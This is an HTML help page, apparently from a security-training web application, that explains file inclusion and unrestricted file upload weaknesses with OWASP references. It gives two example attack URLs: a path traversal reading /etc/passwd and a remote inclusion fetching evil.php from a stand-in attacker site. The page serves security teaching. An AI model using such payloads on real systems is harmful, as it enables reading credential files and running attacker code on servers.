<div class="body_padded">
    <h1>Help - Unrestricted File Inclusions</h1>
    <div id="code">
        <table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
            <tr>
                <td>
                    <div id="code">
                        <p>Some web applications allow the user to specify input that is used directly into file streams
                            or allows the user to upload files to the server.
                            At a later time the web application accesses the user supplied input in the web applications
                            context. By doing this, the web application is allowing
                            the potential for malicious file execution.</p>
                        <p>Local Example: http://securitytraining/sfh/?page=../../../../../../etc/passwd</p>
                        <p>or</p>
                        <p>Remote Example: http://securitytraining/sfh/?page=http://www.evilsite.com/evil.php</p>
                    </div>
                </td>
            </tr>
        </table>
    </div>
    <br/>
    <p>Reference: http://www.owasp.org/index.php/Top_10_2007-A3</p>
</div>
<hr>
<div class="body_padded">
    <h1>Help - Unrestricted File Uploads (and File Upload)</h1>
    <div id="code">
        <table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
            <tr>
                <td>
                    <div id="code">
                        <p>Uploaded files represent a significant risk to applications. The first step in many attacks
                            is to get some code to the system to be attacked.
                            Then the attack only needs to find a way to get the code executed. Using a file upload helps
                            the attacker accomplish the first step.</p>
                        <p>The consequences of unrestricted file upload can vary, including complete system takeover, an
                            overloaded file system, forwarding attacks to backend systems,
                            and simple defacement. It depends on what the application does with the uploaded file,
                            including where it is stored. </p>
                        <p>Another thing worth looking for are restrictions within 'hidden' form fields.</p>
                    </div>
                </td>
            </tr>
        </table>
    </div>
    <br/>
    <p>Reference: http://www.owasp.org/index.php/Unrestricted_File_Upload</p>
</div>


		